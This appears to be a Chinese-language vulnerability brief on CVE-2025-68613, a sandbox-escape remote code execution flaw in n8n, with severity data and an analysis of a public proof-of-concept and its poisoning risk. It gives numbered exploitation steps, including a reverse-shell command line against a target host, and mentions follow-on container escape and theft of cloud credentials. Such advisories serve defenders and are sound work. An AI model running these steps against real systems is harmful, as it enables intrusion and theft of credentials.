## CVE-2025-68613 - n8n (工作流自动化平台) RCE (沙箱逃逸/远程代码执行)

**漏洞编号:** CVE-2025-68613

**漏洞类型:** RCE (沙箱逃逸/远程代码执行)

**影响应用:** n8n (工作流自动化平台)

**危害等级:** 严重 (Critical)

**CVSS评分:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**影响版本:** 0.211.0 ≤ n8n < 1.120.4, n8n < 1.121.1, n8n < 1.122.0

**利用条件:** 需要用户认证 (PR:L)，处于默认配置环境，可远程触发。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 15%

## 详情

【POC有效性分析】该POC由名为'The StingR'的开发者发布，属于一个完整的防御研究仓库。从提供的文件结构看，该POC具有极高的有效性和实用性。它包含一个基于Python的被动扫描器（cve-2025-68613-scanner.py），能够在不触发payload的情况下检测漏洞；同时包含一个Nuclei模板用于大规模资产扫描。核心利用脚本'exploit_cve-2025-68613.py'集成了六种不同的Payload，涵盖了信息收集（info）、命令执行（cmd）、环境变量读取（env）、文件读写（read/write）以及反弹Shell（revshell）。这种多模块化的设计表明该POC不仅是一个简单的概念验证，而是可以直接用于红队评估或深度防御测试的工具。漏洞根源在于n8n处理表达式时的沙箱逃逸（CWE-913），攻击者通过构造特殊的JS表达式，绕过Node.js沙箱限制，直接在宿主机执行系统命令。考虑到n8n通常拥有较高的系统权限以执行各种集成任务，该漏洞的实际危害极大，可导致整个自动化平台及其连接的第三方API密钥全部泄露。【利用步骤】1. 环境准备：安装Python3及必要的依赖库（如requests）。2. 资产识别：使用scanner.py对目标实例进行无损扫描，确认是否存在指纹匹配。3. 获取凭据：攻击者需具备基础用户权限，通过登录获取会话Cookie或API Key。4. 执行利用：运行exploit脚本，指定目标URL和所需Payload模式。例如执行反弹Shell：./exploit_cve-2025-68613.py -u http://target:5678 --payload revshell --lhost <IP> --lport <PORT>。脚本会自动构造逃逸表达式并发送JSON POST请求至受影响的API端点。5. 权限维持：由于n8n多以Docker容器运行，攻击者通常会进一步尝试逃逸容器或通过环境变量提取云服务凭证。【投毒风险分析】该POC项目结构专业，文档齐全，表面上看是一个标准的开源安全研究仓库。然而，投毒风险分析必须关注其庞大的代码量（1550+行）。由于该仓库并未在GitHub等主流公开平台直接展示源码明文（输入中仅显示了文件目录和部分描述），风险主要集中在以下几点：第一，exploit脚本集成了复杂的Payload生成逻辑，若其中混入混淆的Base64字符串，可能在执行攻击的同时向第三方服务器回传目标服务器的敏感元数据或攻击者的身份信息。第二，此类高价值、高评分（9.9分）的漏洞极易吸引安全从业者下载，投毒者可能在脚本的‘依赖检查’或‘初始化’函数中注入静默执行的恶意指令。第三，由于文档中提到了‘TechSquad Inc.’等组织背景，需警惕仿冒知名安全实验室发布的虚假高质POC。目前根据已知描述，该代码库逻辑清晰，未见明显的混淆行为，判定为低度投毒风险，但建议防御者在使用前必须在隔离沙箱环境中对exploit_cve-2025-68613.py的Payload构造函数进行静态审计，特别是关注任何非目标的外部网络请求。

**项目地址:** 基于搜索结果，POC项目常见于GitHub (具体路径未在简报中给出)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2025-68613](https://nvd.nist.gov/vuln/detail/CVE-2025-68613)
